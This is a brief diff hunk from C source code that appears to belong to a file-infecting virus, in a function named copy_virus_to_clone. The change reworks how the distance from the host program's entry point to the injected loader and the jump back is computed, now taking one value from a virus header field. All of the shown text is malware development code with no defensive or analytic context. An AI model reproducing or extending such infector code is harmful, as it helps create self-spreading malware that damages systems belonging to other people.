@@ -24,8 +24,7 @@ bool	copy_virus_to_clone(struct safe_ptr clone_ref,  \
 
 	// compute distances
 	size_t	dist_client_loader_entry = loader_entry_off - client_entry_off;
-	size_t	dist_loader_entry_jump   = jump_back_to_client - loader_entry;
-	size_t	dist_client_entry_jump   = dist_client_loader_entry + dist_loader_entry_jump;
+	size_t	dist_client_entry_jump   = dist_client_loader_entry + vhdr->dist_client_loader;
 
 	// compute code offsets
 	size_t	client_jump_off = client_entry_off + dist_client_entry_jump;
